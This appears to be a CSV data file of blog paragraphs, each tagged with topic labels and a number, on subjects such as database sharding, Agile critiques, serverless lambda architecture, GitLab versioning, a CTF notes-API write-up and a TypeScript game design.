3301,"Partitioning divides a table into multiple tables with fewer columns. The customer table with 20 columns will be split into 2 or more tables. The first table will have columns from 1 to 7 and the second one will have the columns from 8 to 20. Of course, each table contains the primary-key to join data from both tables. This is useful when usually only the first 7 columns are needed. So, it takes less time run as itll bring less data. Those 2 tables could be on the same database or in 2 separate ones. SQL databases support this case by providing features to recognize from which partition to get the data.","['Scalability', 'Database', 'Cloud', 'Kubernetes', 'Docker']",8
3302,"Sharding divides a table into multiple tables. Each table then contains the same number of columns, but fewer rows. For example, the customer table can be partitioned to 5 smaller tables each representing the continent for a group of customers. Knowing the customer location will help to redirect the query to right partition to process less rows. The smaller tables can live in the same SQL instance or in separate ones, the same as with Partitioning. Horizontal and Vertical partitioning can be mixed together.","['Scalability', 'Database', 'Cloud', 'Kubernetes', 'Docker']",8
3303,"Imagine that now each microservice have its own domain tables living in the same container! Still, the SQL databases are not enough for handling all the load? Well, why not trying No SQL? SQL databases are based on schema and relationships between tables. This is at the heart of its limit to reach infinite scalability. On the other side, No SQL databases save data as key-value pairs, no need for schema neither for table relationships. For that reason, tables can be split horizontally and infinitely! Scaling an application on the cloud is not only the responsibility of the architect, but it also requires the developers to think about the stateless aspect and DBA to think about partitioning the database. This work should be done at first. One important note to think about is also Metrics and Analytics. Because those who can tell if we need to scale up or down and especially what exactly needs to be scaled.","['Scalability', 'Database', 'Cloud', 'Kubernetes', 'Docker']",8
3304,"Swedish psychologist Berndt Brehmer once observed that our feeling of learning from experience can be misleading. At times it would be more accurate to say we are conditioned to believe we are learning from experience, when in fact our judgment is not improving (Brehmer, 1980). The real world, he noted, bears little resemblance to what we call learning in school. A classroom is a contrived environment where an artificial gold standard is provided by the teacher. There, learning is just being able to deliver what the teacher asks. This maps very nicely to most product work, where in place of the teacher is the business. It doesnt make for a learning environment, which is necessary for agility.","['Agile', 'Lean Startup', 'Strategy', 'DevOps', 'Business Agility']",4
3305,"Now, what if a research lab was assessed on its experiment output, with no one really focusing on the interpretation and practical import of the results produced? Would this tend to decrease or increase costs? If you dont focus on whether the hypotheses are supported you cant assess whether there might be quicker, cheaper ways to test them. This brings us to a key issue with the Agile movement. Agile kept the focus on output and requirements, ignoring that delivery is never a good gold standard. In many contexts this just creates waste.","['Agile', 'Lean Startup', 'Strategy', 'DevOps', 'Business Agility']",13
3306,"Agile is often said to be incremental and iterative. The increment is the chunk of product delivered at the end of the time box. Then you repeat the cycle and deliver another increment at the end of the next time box. This repetition is what Agile means by iterating, which is not the same thing as pivoting. To pivot you might need to throw out your previous product increments and try something else entirely. Almost no Agile team does this, a point Alan Cooper has been making for years. Typically, Agile teams arent making pivot or stop decisions at allthey just incrementally persist and call it iteration. They dont reject hypotheses and then try other ways to achieve outcomes. They cant, because thats not something anyone is even paying attention to! )The practical result is the more product increments are added, the fewer degrees of freedom there are, which, when you think about it, is really the opposite of agility. Now, as Allen Holub likes to remind me, there is no such thing as Agile. Theres the Manifesto, and theres different peoples take on it, and thats it. Most orgs equate Agile with Scrum, period. Sutherland figured out how to sell Scrum to businesses with the alluring promise of twice the work in half the time (sofour times the work?). Though that might be how the business tends to think of Agile, it really doesnt have much to with agility. Other Manifesto coauthors have other ideas. Jeffries, for instance, has been very adamant lately that he does not care about org agility and that the point of Agile is to make life better for developers. Note that the business take often has the opposite effect.","['Agile', 'Lean Startup', 'Strategy', 'DevOps', 'Business Agility']",12
3307,"Its often argued that the way out of this mess is to put outcomes over output, but even this can go sideways depending on the definitions used. Outcomes are best described in the Lean Startup book, Lean UX (Gothelf & Seiden, 2013). Many seem to equate outcomes with vague goals or objectives, which misses the point. (In my opinion this is why the concept of OKRs is not value-adding.) An outcome is not impact, which is likely your real goal. An outcome is the concrete behavior change youre trying to create to deliver business impact. This spotlights a point I first saw made in Andersons (2011) Seductive Interaction Design: There is only one way to create business value, and thats to change someones behavior. Treating delivery as a proxy to this stops short. (This is why cost of delay should ultimately be tied to outcomesthe value isnt created until the value-adding behavior change actually happens. )Anyone whos toyed with this will know it can be very challenging to get people to state concrete outcomes. Interestingly, the same point is made in therapy, and the best techniques Ive come across for eliciting outcomes actually come from therapy and change work! It was in reading about Clean Language and Symbolic Modeling that I learned that people just naturally like to talk about problems and solutions, whereas eliciting good outcomes typically requires skilled coaching. Talking about problems can be cathartic, but the goal is not to be in therapy for decades. What changes, specifically, are you trying to create? How will you know when the therapy is done? Its not when its been delivered! Its when certain sustainable changes have taken place.","['Agile', 'Lean Startup', 'Strategy', 'DevOps', 'Business Agility']",12
3308,"Apply this to product work: Agile teams also tend to think of their work in terms of problems and solutions. In fact, we tend to call what we build the solution, ignoring that this is largely metaphorical. When you solve a math problem, for instance, the problem is known, its taken for granted. In product work, however, the assumed problem is often not the real issue. Further, a math problem typically has an objective and unique solution. What youre building is not THE SOLUTION. What youre asked to solve is commonly not THE PROBLEM. Theres also a psychological difference of orientation. A problem-solving frame has a negative, away-from orientation. A problem is something that needs to be escaped or remedied.","['Agile', 'Lean Startup', 'Strategy', 'DevOps', 'Business Agility']",12
3309,"An outcome frame, on the other hand, is a positive frame. I sometimes see people say that achieving an outcome is the same thing as solving a problem. As Tompkins and Lawley (2006) observe, knowing what youre moving away from does not mean you know what you want to move towards. Ive encountered this many times in an exercise I like to run in classes. I have teams of people freelist, affinitize, and dot vote in response to the question, What are your difficult problems with delivering value to customers? The top cluster that emerges is almost always the same. Its some variation of, No one can really say what were trying to achieve.","['Agile', 'Lean Startup', 'Strategy', 'DevOps', 'Business Agility']",4
3310,"Without concrete desired outcomes in place, you dont have what Ive been calling unambiguous pivot signals. An outcome gives you a line in the sand, letting you know whether to pivot, persist, or stop. As Tompkins and Lawley put it, digging into a problem and coming up with a solution often narrows your options, which reduces paths to value. By instead spotlighting the desired outcome, you open up the field and leverage greater creativity in service of discovering different ways to achieve it. This increases options, which should be one of your primary goals.","['Agile', 'Lean Startup', 'Strategy', 'DevOps', 'Business Agility']",1
3311,"When business reps push back on such points, Kohavi et al. note, they are essentially claiming an empirical approach to product work isnt needed. If this is true, however, then they should be able to predict the results of the hypothesis tests theyre claiming are unnecessary. In another experiment, Kohavi et al. tested this as well, asking people to guess the results of eight A/B tests. Anyone who could successfully predict the results of six would win a shirt. After more than 200 attempts, they ended up giving awayzero shirts. Out of eight guesses, participants were correct 2.3 times on average, meaning their predictions were wrong more than 70% of the time.","['Agile', 'Lean Startup', 'Strategy', 'DevOps', 'Business Agility']",13
3312,"To close, Im not saying we shouldnt talk about problems or solutions anymore, just that we should be more mindful of how concepts influence thinking. Words have consequences, and metaphors carry baggage. Ultimately, I agree with Kees Dorst (2015), who argues much of the failure in applying design thinking to business comes from keeping the focus on generating solutions as opposed to frames. (I wrote about problem frames here.) In the next post well need to talk about techniques for eliciting outcomes, as well as what makes for a good outcome. For now, Ill leave you with this thought: References Adzic, G. (2012). Impact mapping: Making a big impact with software products and projects.","['Agile', 'Lean Startup', 'Strategy', 'DevOps', 'Business Agility']",12
3313,"Kohavi, R., Crook, T., Longbotham, R., Grasca, B., Henne, R., Ferres, J. L. & Melamed, T. (2009). Retrieved on October 18, 2016 from: http://ai.stanford.edu/~ronnyk/Ex PThink Week2009Public.pdf.","['Agile', 'Lean Startup', 'Strategy', 'DevOps', 'Business Agility']",5
3314,"I attended Its all about Morphisms by Uberto Barbini from Gama-soft, in part, to brush up my functional programming & with the added motivation that I may be better equipped to understand what the heck my son is doing at Liverpool Uni in his final year project (hes using Haskell & Tidal Cycles to produce live coding musical patterns using chaos theory). Uberto described his talk as a gentle introduction to Category Theory for programmers used to OOP but interested in functional programming. Im not so sure the latter was necessarily true but I more or less followed Uberto for the first half of his talk and then things became a little blurry. However, I have added monoids, monads & functors to my growing list of stuff that I should know more about. One thing that I particularly want to explore along with my recent Kotlin endeavours & which he touched upon during the talk was Arrow-kt which is a functional companion library to Kotlins standard library.","['Kotlin', 'Jax London']",2
3315,"Today, writing code is a well-worn, intrinsic element of my daily work. Yet internally, my past underscores my present in everything I do. It is my between-the-lines professional bio: I used to be an artist, now Im an engineer. I used to think about aesthetics and emotions, now I think about problem-solving and planning. I used to hone my fine-grain antenna for intuition, now I cultivate my sense of conscientiousness. Every new task I point myself towards is first ensconced within this storys arc.","['Coding', 'Musicians', 'Work', 'Creativity', 'Philosophy']",2
3316,"This habit of mine also continuously stokes a burning private question: is all that historical time spent thinking about beauty and feelings a hindrance to my current craft, or a boon? Working in the artistic world defined my process of making thingsin what ways does this modulate my approach to software? And are those ways good, negligible, or terrible? I believe musicians and coders actually share the same basic challenge, and it is something like this: take scattered gobs of technical stuff and somehow jam them together in a way that appears simple, natural, and magically compelling to the outside world. If things go well, we navigate the swarm of causal details to keep the spotlight focused on the relevant effects. There is no avoiding such a swarmour job is simply to contain it, arrange it, and point it towards what we judge to be the things that actually matter, while black boxing it to stakeholders. This is what a successful musical arrangement does. This is also what a successful computer program does.","['Coding', 'Musicians', 'Work', 'Creativity', 'Philosophy']",4
3317,"While there are actual technical problems in music (guitar amplifier doesnt work, etc), the real problems to solve are aesthetic. This means, how do you adjust things to make something feel more fragile, more aggressive, more like, oh I dunno, snow falling in a big city at night? Why does this one line of a vocal performance work while this other one does not? To deal with these kinds of problems, you have to deal with the gestalt, the totality, the simultaneity of things. One takes in all aspects at once, makes subtle iterative movements toward the desired effect, and observes how those movements ripple outward to affect the whole. You take a bunch of linear elements, stack them all on top of each other, zoom waaaay out and judge the effect. In other words, your goal is to make a good forest.","['Coding', 'Musicians', 'Work', 'Creativity', 'Philosophy']",14
3318,"With art, eureka time is party time. If I play back my song and everything feels balanced and just so and makes the persons in the room feel the things they want to feel, I can pack it all up and call it a day. The only real uncertainty after the initial victory is, will I still feel the same things when I play this back tomorrow? (which oftentimes you dont, because things feel different at different times and contexts, and all that is terrifying and mysterious, but that is another article) But really, you are more or less finished.","['Coding', 'Musicians', 'Work', 'Creativity', 'Philosophy']",4
3319,"That first eureka moment is only the first leg in the race. Okay, this thing works, for a single user, in a single environment, in a single test. Will it work a thousand times in a row? Will it work for a thousand people at once? When it doesnt work, how will we know about it? As an artist, these were completely foreign considerations. Scale and consistency were not issues I had ever needed to worry about.","['Coding', 'Musicians', 'Work', 'Creativity', 'Philosophy']",13
3320,"In my own experience, I think this is what I had to learn in order to transition meaningfully. I always created things with satisfying effects. I never missed the mark on what was supposed to happen. But once built, those effects often broke down.","['Coding', 'Musicians', 'Work', 'Creativity', 'Philosophy']",4
3321,"Creative ecstasy is also a very real component of engineering. But, it is not all of engineering. Most seasoned technicians will tell you that the real shit is what happens before and after the nucleus of raw creation. It is about the surprisingly immense power of truly careful planning, and truly thorough testing. It is about how trust in your tools and the data they provide can achieve things unimaginable by your creative impulse alone. By quietly and persistently seeking what is actually true, and then ceding ourselves to it completely, we extend our reach dramatically.","['Coding', 'Musicians', 'Work', 'Creativity', 'Philosophy']",4
3322,"It has taken me years of on-the-job learning to begin to understand these things. It has taken even longer to begin to be driven by them. Despite sharing a core of creativity, engineering is different than art in crucial ways. But, it offers its own rewards. It has its own deep beauty. It has its own potent highs. One simply must be patient, careful, and quiet enough to notice them.","['Coding', 'Musicians', 'Work', 'Creativity', 'Philosophy']",4
3323,"This work actually was inspired by my Big Data AWS training couple months ago with AWS Solution Architects in Traveloka Jakarta office. On that training, they proudly told us that they now have full set of serverless solution for Big Data. It includes AWS Kinesis Firehose (AWS Messaging Service solution), AWS Glue (AWS Serverless Batch Processing Solution), AWS S3 (Cloud Storage), AWS Firehose Analytics (AWS Realtime Streaming SQL Solution) and their new product named AWS Athena used for running Adhoc query to data stored in AWS S3. Go to this link to read the complete explanation about those things. Then, Im thinking, why not doing the same thing in GCP? If you are not familiar with Lambda Architecture, you might need to read some articles on internet about it. Here is the some key concepts cited from __url__ processing.","['Google Cloud Platform', 'Lambda Architecture', 'Serverless Architecture']",11
3324,"I started this project by using public streaming data available on the internet and by picking one simple user story. The decision comes to M __url__ RSVP streaming API. Fortunately, __url__ provides free public streaming API that we can use to get all RSVPs that have been made world-wide. This should be enough for us because we just want to create speed layer and batch layer consuming those data. Then the user story chosen is: You must be asking why it is for every 15 minutes while we can actually put the data somewhere, run the query and get the data for every minutes. This is just for simplifying my further explanation.","['Google Cloud Platform', 'Lambda Architecture', 'Serverless Architecture']",6
3325,"Techinically in lambda architecture, the speed layer and batch layer are made so that they can provide (near) realtime analytics to the business decision maker or business analysts. In the real world, running batch job is expensive in terms of money and time consumed by the application. On the other hand, business stakeholder simply cant wait to get the current data until the next batch job runs on the cluster. However, it is worth to note that batch processing should be the source of the most accurate data a company or organization can have. What we can do to solve this dilema? Streaming or speed layer comes to the resque. Speed layer provides us with the estimated data in (near) realtime manner. Its really hard to get the accurate data by using the speed layer. On the other hand, speed layer can provide the user with the current data easily. So, what we can do to get the realtime data? The answer is simply by combining the data from the batch job and realtime streaming job. Yes we need to take the trade off.","['Google Cloud Platform', 'Lambda Architecture', 'Serverless Architecture']",10
3326,"Assume that now is 8 AM in the morning and CEO __url__ wants to know the number of RSVP have been made up until now since yesterday midnight. However, the last batch job run 12 AM on last night so we clearly dont have accurate data from 12 AM until 8 AM. In this case, we need to combine the accurate data from the last batch job with the estimated data from the straming job runs from 12 AM until 8AM. Once we run the next batch job and get the accurate data for today, we can simply rewrite the result written by the streaming layer in the serving layer. Dont forget that we sacrifice the accuracy of the data a bit in this case, but to save the costs and for faster data driven decision, it is worth investment, IMHO.","['Google Cloud Platform', 'Lambda Architecture', 'Serverless Architecture']",8
3327,"Speed Layer Cloud Dataflow is used as the streaming engine in our implementation of speed layer. There are two responsibilities of the speed layer in our use case. First is to write the data pulled from the Pubsub to Google Cloud Storage by using Text IO so that the Batch layer can consume these data later and run batch processing on top of it. The second is to aggregate the number of RSVP comes to the system for every 15 minutes window. Once it gets the number, it will store the result to Google No SQL technology named Cloud Bigtable by using Bigtable IO. We can also dump the data to Google Big Query by using Bigquery IO, however we dont really need it in this use case.","['Google Cloud Platform', 'Lambda Architecture', 'Serverless Architecture']",11
3328,"You can go to the streamprocessor/RSVPStream P __url__ to see what is happening. : DThe DAG is pretty simple. First, rsvp Parser used to serialize String given by Pubsub to Java Object. Then, every object parsed will be grouped by using 15 minutes fixed window in rsvp Group Window. In order to group the RSVP, I use rsvp Keyify and rsvp Group By Key to give every RSVP a key representing the time window of its arrival timestamp. Then to aggregate the number of RSVP within the same fixed window, I used rsvp Reducer to simply accumulate the count. Then transformation to a Hbase Put object is done and then the result is stored in our Cloud Bigtable using Bigtable IO plugin.","['Google Cloud Platform', 'Lambda Architecture', 'Serverless Architecture']",15
3329,"In designing No SQL schema, we need to think about how we gonna query the data. Since we want to query the data based on its date, we can simply use date yyyy MMdd as the partition key of the table. To get the data for every 15 minutes, we can create a column family called count containing many columns for storing the count for every 15 minutes. The way I do it is by using string 0000, 0015, 0030, 0100 and so on as column name to represents the time window of 15 minutes. By using this schema design, we can get additional benefits if: We want to get the total rsvp in a single day, we can simply iterate over all of the column for a partition on the fly.","['Google Cloud Platform', 'Lambda Architecture', 'Serverless Architecture']",8
3330,"In most cases projects have external events related to certain dates, appointments and you can be lucky when you are allowed to buy some time to delay the delivery, but in the reality you cant. Its good to have the possibility to split your work in two to be ready for partial delivery in case of emergency. Your final target is a demanding customer, please imagine that he is a stalker that knows where you live. This picture motivates you to make a decision about what exactly should be delivered once a deadline comes. Please shift the deadline back to be sure that youre able to complete your work in time. Sometimes pushy product owners are so needydont hesitate to resist them.","['Agile', 'Android App Development', 'Refactoring', 'Project Management']",1
3331,"Let me give you an example. Assume we have two features that should take us about one and half weeks (agreed sprint slot was 2w). During that time all of the sudden appears new requirement that enlarges development so testers couldnt start their work in time. In this case we have bug overflow just before planned release. Should we sacrifice one of the feature to complete on 100% one of them? Actually there are multiple solutions how to solve that. For example, we can plan one feature for half of sprint splitting it between whole developers. So just after its completed we could start new feature for the next sprint. But not in our case, our management likes when plate is full all the time.","['Agile', 'Android App Development', 'Refactoring', 'Project Management']",1
3332,"Decisions were taken in order to use a possible maximum conservative development strategy. At the moment it was: using standard Android components, no cache, no database, no screen rotation at least during the MVP stage. We used an Android Service system component and Thread Pool Executor for API requests, minimal set of third parties (Retrofit for instance), UI was based on multiple activities bound to the service, plus headless fragment as a Presenter. We also used Weak References to prevent memory leaks, plus Idling resource implementation for Espresso tests. This approach was described in Googles official documentation that we could easily refer to. The main reason for using multiple activitieswas design. It contained translucent status bar screens scattered over the whole project.","['Agile', 'Android App Development', 'Refactoring', 'Project Management']",6
3333,Firstly general refactoring were driven by performance optimization. We decided to get rid of the Service. The Android binder is sluggish and by using Retrofit directly from a presenter proved to be the best solution for that moment. Another a good feature was to use Rx Java2 and Dagger 2 instead of a custom executor. Finally we got rid of activities by keeping only two (main activity and checkout). All our UI components were based on the fragments since at that moment. The translucent status bar theme was swapped by a black status bar theme which was more easy to handle with Activity recreate method. Of course refactoring cannot be provided with the wave of a magic wandit was covered by new feature implementations. Many advice on how to do that can be found in Working Effectively with (Android) Legacy Code and Refactoring Catalog.,"['Agile', 'Android App Development', 'Refactoring', 'Project Management']",6
3334,"There are always many things to improve. First achievable goal in our case to complete phase 2 for all features and to move to the Android Jetpack announced by Google nowadays. But each goal demands time and effort. The most challenging thing is to tell yourself: Stop refactoringfeature first. Everything you do is for your clients after all, and. one of them is, for sure, a stalker!, please dont forget this;).","['Agile', 'Android App Development', 'Refactoring', 'Project Management']",1
3335,"This approach works well with REST APIs simply because the result of any given request will involve a foreseeable cost to service. For example, in our Harvest API, every request to the GET Employee endpoint will entail a fairly predictable amount of work - the returned object is (for the most part) always the same shape and contains the same fields. This, however, is not true with Graph QL. Graph QL requests are incredibly flexible. They allow consumers to specify exactly what information they want from us. Consequently, a single Graph QL request could generate as much work as multiple REST requests.","['GraphQL', 'Ruby', 'API']",10
3336,"One of the more obvious ways to craft a malicious Graph QL request is to exploit nested relationships on a given object. For example, the Onboarding API exposes an Employee type. Each Employee can belong to a Department, and each Department can have an Employee in the form of a department Lead. Recognizing this, one could form a query like this: A cyclical relationship could very well exist between the Employee and the Department (e.g. Artemis is the Engineering Department Lead, and she also belongs to the Engineering Department). This is a circular reference that could lead to significant load on our API servers.","['GraphQL', 'Ruby', 'API']",8
3337,"Though our current resource-limiting methodology fails to properly incentivize consumers, it fits our current needs. Going forward, this may not always be the case. We plan on monitoring the usage of the API and adapting our strategy accordingly. We may find that certain fields are more expensive, so well increase their complexity costs. We may find that certain relationships require excessive JOINs in our backendso perhaps well consider adding a stronger point multiplier for them. Finally, we may get to the point where our hybrid approach fails to scale any further, and at that point wed make the move to a completely point-based strategy.","['GraphQL', 'Ruby', 'API']",6
3338,"I quickly decided that the commit style format was my least favorite option. It heavily relies on an alignment between all engineers regarding the format to use. Besides that, a lot of us tend to use the squash commits when merge request is accepted feature in Gitlab. If you squash the commits, all individual commit messages will be lost. Gitlab will merge the branch with a pre-formatted commit message. Since the pre-formatted commit message doesnt contain any information on what kind of changes are in the branch, this would imply that the engineer would need to manually change the commit message for the merge request to adhere to the agreed commit message format.","['Git', 'Gitlab', 'Semantic Versioning', 'Ci Cd Pipeline', 'Automation']",18
3339,"But what about merge request labels? Gitlab allows for adding labels to a merge request. I could thus decide to have 2 labels: bump-minor and bump-major. If one of those labels is set, I bump the project accordingly. If none is set, I default to a patch upgrade. This sounds easy enough, but how do I define labels? Gitlab allows for defining labels on a few different levels. A Gitlab administrator can create labels on a global level, but unfortunately, these labels do not propagate to existing groups. A group administrator can also set labels at a group level, as well as project-specific labels From a user perspective, only requiring someone to add a label to a merge request seems a lot easier than manually changing a commit message to a specific format.","['Git', 'Gitlab', 'Semantic Versioning', 'Ci Cd Pipeline', 'Automation']",18
3340,"To get around this, I generally create a user account per team and Gitlab group to use as an NPA. This single account can be used to fulfill our 2 authentication requirements. To share the credentials with the pipeline, I tend to set the username and password as Group-level environment variables. You can configure these by going to the Group variable settings in Settings -> CI / CD -> Variables So what does the end result look like? A 3 step process is required to set up automatic semantic versioning in any Gitlab repository: Generate a unique version Bump the version Tag the latest tag build as latest The generate-env-vars step uses git describe tags alwaysto create a unique tag for every build. On tag builds, it defaults to the last available Git tag. For any branch build, it results in a combination of the last available Git tag and the short hash for the commit. I write the tag and image name to a dot file which I can inject into any subsequent stage.","['Git', 'Gitlab', 'Semantic Versioning', 'Ci Cd Pipeline', 'Automation']",7
3341,"The title of the README page says Notes RPC Documentation. The page says: The service requires a valid JWT (JSON Web Token) to perform the authentication. We can perform the following operations in the service: Query the metadata of all the notes Retrieve a note Create a new note Delete all notes Nothing fancy here. Now under the title Versioning, the following is mentioned: There does not seem to be any reason to explicitly state that only v1 is allowed. But for now Ill try to understand how the API works.","['Hackerone', 'Ctf', 'Hacking', 'API', 'Web']",15
3342,"Hidden in plain sight yet invisible. I shouldve seen this sooner, but better late than never. This suggests that my initial suspicion about the API version description was kind of right there is something unusual with API v2. Theyre using an optimized file format that sorts the notes based on their unique key before saving them. I googled around a bit to see if there are any such file formats. In one of my searches, I came across Amazon Red Shift: I later realised that it was not the right path. Why not fiddle with API v2 and see? I followed the same process as before: Creating a note gives a url that contains the ID as the id parameter Getting the contents of a note gives note (the note contents) and epoch (the timestamp).","['Hackerone', 'Ctf', 'Hacking', 'API', 'Web']",15
3343,"But they have mentioned that v2 is using some fancy sorting thingylets experiment with that now. In the documentation, it says the method sorts the notes based on their unique key before saving them. Well, every note has two parameters the notes ID (which we can arbitrarily assign) and the note contents. Its only logical that the unique key here is the note ID. Lets try creating more notes with random IDs to see if we can find something.","['Hackerone', 'Ctf', 'Hacking', 'API', 'Web']",3
3344,"I first tested it with lower-case alphabets as before, and that worked same as before. It kept on adding the new notes epoch to the end of the list. What if I try with upper-case alphabets? Theres a break in the pattern where 1530295860 appears (after inserting F, specifically). It did not get inserted to the end. After pondering about it for a while, it struck me! The notes could very well be ordered lexicographically! Lets say the note has the ID of bar. Then if we add new notes with ID that is lexicographically < (read: less than) bar (eg. abc), it will get inserted in a position before bar; and if it is lexicographically > bar (eg. zap), it will get inserted after bar.","['Hackerone', 'Ctf', 'Hacking', 'API', 'Web']",3
3345,"As engineers build more services, it is important that all services adopt consistent best practices. For example, a service request has contextual information associated with it, and the request context should be propagated on the service RPC call chain. This would be difficult to manage if different services had different ways of propagating this context (or not at all), or if this context was defined and obtained in different ways. It would also be a headache for SRE to monitor and debug SOA issues if each service emitted different metrics and had different types of alerts. Emitting standard request and response metrics on both server-side and client-side not only allows for better monitoring in and outside the service-owning team, it can be leveraged for creating automated service dashboards and alerts. Service clients should also adopt standard RPC timeout, retry, and circuit breaker logic; our generated RPC clients makes it so service developers dont have to implement these RPC resilience features themselves.","['Microservices', 'Java', 'Airbnb']",10
3346,"Used in software development projects, the phases typically look like this:1. Requirements If you are into software development or any type of project creation team, you would want to know the business context of what you are trying to createyou want to define what kind of problems you are trying to resolve and how people would react to your finished product. After you define all these requirements, you have the input that you need to move on to the next step.2. Designing This step is made up of all the steps that you need to satisfy all the requirements that you have determined earlier. In software development, this is the part where you define all the software and hardware architecture, programming language, data storage, etc. This is also the part wherein you determine how the project would be useful to its end user.3. Implementation In this step, you begin to construct what you have designed in your plan. This part of the Waterfall method is dedicated to meeting the standards that you have made in the previous steps. This is the part where people from the development team come in and make all the things discussed in the previous steps happen.4. Verification This is the part of the method where quality assurance people enter to ensure that the development team did not make any mistakes. This is also most likely the part where people realize what is working or not working in their plan.","['Agile', 'Software Development']",12
3347,"If youve been hitchhiking around the galaxy of agility at enterprise scale, you may already be familiar with this guide. Which means that you might be aware of where you are in this intergalactic journey of ours. Here you are: You are most likely a product owner in charge of a team that is part of a much larger initiative to deliver an enterprise-grade product. And, if you followed chapter one of this guide, then by now: You know your users pretty well. You used impact mapping to map out their business goals into the applications user needs, and from there, you will derive your entire product backlog.","['Agile', 'Product Management', 'Product Development', 'Software Development', 'Product Owner']",6
3348,"When it comes to your backlog, and the performance and quality of your teams deliverables, this is precisely how it works! The backlog aspect is especially critical if you are implementing low-code technology as we are in this case; it gets consumed about twice as fast. So, without a well-defined backlog, you will block your team double! And you dont want to do that, so how can you avoid this? Remember when thought you had written your best user story ever? You really took your time with that one, thought it through, let it mature, and considered all possible angles. What a great piece of requirements engineering, you must have thought. Almost as if it was the answer to life, the universe, and everything.","['Agile', 'Product Management', 'Product Development', 'Software Development', 'Product Owner']",1
3349,"One domain embeds a responsibility belonging elsewhere. For instance, suppose we need to email a customer a notification after a successful registration. Should these notifications be constructed in the Customers domain (e.g. get the email address, the email template, then inject dynamic content into that template), or the Notifications domain? Yet, I often see this anti-pattern applied in unexpected places; e.g. another developer copies and pastes the notification logic from the Customers domain into the Carts domain, and now theres two polluted domains and a duplication of logic (a code smell)I presented this example earlier (e.g. cross-domain SQL pollution), so I wont repeat it here.",['Software Architecture'],19
3350,"This article (I hope) clarifies why we should (where practical) avoid domain pollution. So, what can we do about it? The answer is to (a) encapsulate the data store, so others cant access it, and (b) always use an interface (e.g. REST API), and never undermine it through circumvention; i.e. One approach to the database pollution problem is to (where practical) force the issue. For instance, by intentionally selecting to use a different data storage technology per domain (e.g. Customer data in a relational Postgres database, Cart data in a Dynamo DB No SQL database), we can prevent a direct data-level JOIN. Of course, this option isnt always available (or sensible).",['Software Architecture'],8
3351,"Replace with your own name or username. When I first tried using Open Faas without the prefix my function name was bash. This caused an issue which wasnt immediately clear. Although the image was built successfully and named bash:latest, this image was not used by the function and instead bash:latest from Docker Hub was pulled and used. Just something to be wary off.","['Docker', 'Openfaas']",7
3352,"After that, copy over all contents of /dependencies to /app_workdir. Thanks to the bind mount, our dependencies will now appear on the host too. The copy operation from /cache to /app_workdir is done by SSH-ing into the container and running cp SOURCE DEST. For big projects with many dependencies, copying can take as long as ~10 mins. This may vary depending on the performance of your host machine, but in essence, you have to be mindful of this drawback.","['Docker', 'Containerization', 'Golang', 'Docker Compose', 'DevOps']",7
3353,"Lets talk about future-proofing and over-engineering. Many times these two concepts will clash. Future-proofing can make things easier to deal with in the future but also takes an extra effort. If a future-proof part of a system never changes that effort will never pay off. In this article, I will be using a simple grid game as a base project so we can wander about these subjects. The full and final code is available at __url__ faster.","['JavaScript', 'Typescript', 'Phaserjs', 'Future Proofing', 'Overengineering']",10
3354,"The description above is our projects scope. The complete understanding of a projects scope is essential for many reasons. Lets, for instance, analyze the size of a projects scope. You may have heard of a Java Script library called Redux. Many people say that it is complicated and not recommended for small projects. But it pays off in the long run, especially if the project grows big. People also say that N __url__ is about a thousand times better than Java when it comes to simple websites, but as your business logic grows at the server side, Java might be a good option. So scope size gives a good hint about what languages, tools, and frameworks are suitable for a project.","['JavaScript', 'Typescript', 'Phaserjs', 'Future Proofing', 'Overengineering']",19
3355,"But of course, been software a process, it is always changing. The best tools for the present scope may not be the best for tomorrow. So there is where future-proof comes in. Before thinking in the most complex scenario possible lets first analyze the likelihood of change. For example, if you ever worked with anything heavily dependent on laws you know things can change at any moment. Politicians are always creating and altering laws and every time they do it software will have to adapt. An initially small scope can grow as the rules evolve. But if you decide to build a tic-tac-toe game, there is no much to change at all. The scope is small and will remind that way. Going back to Gem-crush, what is most likely to change? Maybe a new kind of diamond? Perhaps this new diamond that does something different. Like one that can explode or be more than one type at the same time. Also, the grid can grow or shirk. Id say that is about it.","['JavaScript', 'Typescript', 'Phaserjs', 'Future Proofing', 'Overengineering']",12
3356,"The code above represents a first version or the first code that does what the scope requires. On the very first line Phaser, our game framework is imported. The second line is a class in a different file; we will take a closer look at it later. By the name is quite clear what this class does. It is responsible for loading images, sounds, etc. Then there is a list of all the possible things this entity can be.","['JavaScript', 'Typescript', 'Phaserjs', 'Future Proofing', 'Overengineering']",15
3357,"The Gems class constructor shows the first room for improvement. Some time objects do need a lot of properties. When this happens what you should do is to turn all those parameters into one single object. Otherwise, it can lead to confusion and mistakes, even with the help of Typescript. The first four arguments are numbers and if you swap x with y typescript wont complain. On the other hand, an object is explicit about its properties and doesnt rely on order but on names.","['JavaScript', 'Typescript', 'Phaserjs', 'Future Proofing', 'Overengineering']",15
3358,"Phaser uses strings to name and find images. So on the third line, there is a const IMAGE_PATH to make sure the path to those images will be something trivial do update. There is also a load method to sugar coat the loading process. That is a very nice thing to have when/if the framework changes. If the Phaser team decides to alter the way images are loaded this project can get away using this same method just by updating the Resources class and nothing else. At the bottom all the images have an object name, again, correlated strings spread across the code base can be quite a headache to update sometimes.","['JavaScript', 'Typescript', 'Phaserjs', 'Future Proofing', 'Overengineering']",15
3359,"The Grid class is something worth to think about before coding. A grid is something that has columns, rows, and cells! How can we do that in typescript? The very first approach is a 2D array. That will work, but it can be quite messy. What dimension will be the columns and what will be the rows? What if a want a list of columns and a list of rows? With that in mind lets write a generic Grid class: This is a very generic grid with all the methods we need not only for this project but possibly to others too. For example, it would be possible to reuse this class in a chess game. The grid object will be inside the Gem Grid class. We could extend it, but this way it is possible to pass the grid object around without having to give other object access to the methods inside Gem Grid and also avoid circular dependencies. This is how the final code looks like: A lot is going on with the imports. We know what Phaser and Gem are, just like the Grid objects. Match Sequence Helper is a very simple class responsible for helping us map sequences of diamonds. Gem Factory is a big improvement to the gem generation, and Gem Type is just a formalization of the entities present in the game. This is the full implementation for Gem Factory: What Gem Factory allow us is to have an object responsible for managing the gem generation instead of the class Gem itself. Now Bedrock is a separated class extended from Gem. That makes it easy to implement a specific behavior. So easy that a new entity was created. That was definitely not in the initial scope. But scope can change, grow, and evolve. The random generation is also different; now there is a rare property to make sure bedrock will show up less the regular diamonds.","['JavaScript', 'Typescript', 'Phaserjs', 'Future Proofing', 'Overengineering']",9
